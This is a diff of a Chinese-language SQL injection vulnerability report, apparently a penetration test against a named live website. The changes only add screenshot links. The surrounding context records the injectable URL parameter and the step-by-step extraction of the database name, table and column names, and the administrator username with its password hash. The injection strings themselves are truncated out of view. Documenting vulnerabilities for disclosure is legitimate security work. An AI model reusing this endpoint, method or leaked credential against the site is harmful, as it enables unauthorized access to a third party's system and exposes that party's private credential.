@@ -48,7 +48,7 @@
 
 结论：查询结果有 6 列
 ```
-
+![](assets/SQL%20注入漏洞报告/file-20260312100702513.png)
 ### 3.3 数据库信息获取
 ```sql
 Payload: http://www.dlhayashi.com/index.php?c=text&a=gywm&id=10 
@@ -56,7 +56,7 @@ Payload: http://www.dlhayashi.com/index.php?c=text&a=gywm&id=10
 
 结果：成功获取数据库名 qdm177261645_db
 ```
-
+![](assets/SQL%20注入漏洞报告/file-20260312100725526.png)
 ### 3.4 表名获取
 ```sql
 Payload: http://www.dlhayashi.com/index.php?c=text&a=gywm&id=10 
@@ -66,7 +66,7 @@ Payload: http://www.dlhayashi.com/index.php?c=text&a=gywm&id=10
 
 结果：成功获取表名 jm_admin, jm_en, fenlei, jm_on, jm_hdj
 ```
-
+![](assets/SQL%20注入漏洞报告/file-20260312100738397.png)
 ### 3.5 字段名获取
 ```sql
 Payload: http://www.dlhayashi.com/index.php?c=text&a=gywm&id=10 
@@ -76,7 +76,7 @@ Payload: http://www.dlhayashi.com/index.php?c=text&a=gywm&id=10
 
 结果：成功获取字段名 id, username, password, group
 ```
-
+![](assets/SQL%20注入漏洞报告/file-20260312100749916.png)
 ### 3.6 管理员账号密码获取
 ```sql
 Payload: http://www.dlhayashi.com/index.php?c=text&a=gywm&id=10 
@@ -85,7 +85,7 @@ Payload: http://www.dlhayashi.com/index.php?c=text&a=gywm&id=10
 
 结果：成功获取管理员账号密码 admin:90763170887b9ef5a364fbfb115
 ```
-
+![](assets/SQL%20注入漏洞报告/file-20260312100801133.png)
 ## 4. 漏洞验证
 
 ### 4.1 错误信息验证
